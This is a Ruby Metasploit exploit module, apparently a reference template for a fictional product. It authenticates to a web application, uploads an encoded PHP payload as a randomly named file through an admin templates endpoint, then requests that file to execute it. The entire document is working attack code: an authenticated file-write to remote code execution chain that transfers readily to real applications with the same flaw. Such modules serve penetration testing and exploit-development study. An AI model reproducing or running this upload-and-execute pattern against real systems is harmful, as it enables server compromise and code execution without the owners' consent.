class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Example Product Authenticated File Write',
        'Description' => %q{
          This reference module demonstrates an authenticated HTTP file-write
          flow, response checks, and cleanup for a fictional product.
        },
        'Author' => ['ZeroForge'],
        'References' => [['URL', 'https://example.invalid/file-write']],
        'License' => MSF_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use TLS', true]),
        OptString.new('TARGETURI', [true, 'Application base path', '/']),
        OptString.new('USERNAME', [true, 'Application username']),
        OptString.new('PASSWORD', [true, 'Application password'])
      ]
    )
  end

  def exploit
    name = "#{Rex::Text.rand_text_alpha_lower(8)}.php"
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'templates'),
      'cookie' => "session=#{authenticate}",
      'vars_post' => { 'name' => name, 'content' => payload.encoded }
    )
    fail_with(Failure::Unreachable, 'Target did not respond') unless response
    unless response.code == 201
      fail_with(Failure::UnexpectedReply, 'File write was rejected')
    end

    register_file_for_cleanup(name)
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'uploads', name)
    )
  end

  def authenticate
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    )
    fail_with(Failure::NoAccess, 'Authentication failed') unless response&.code == 302

    response.get_cookies[/session=([^;]+)/, 1]
  end
end
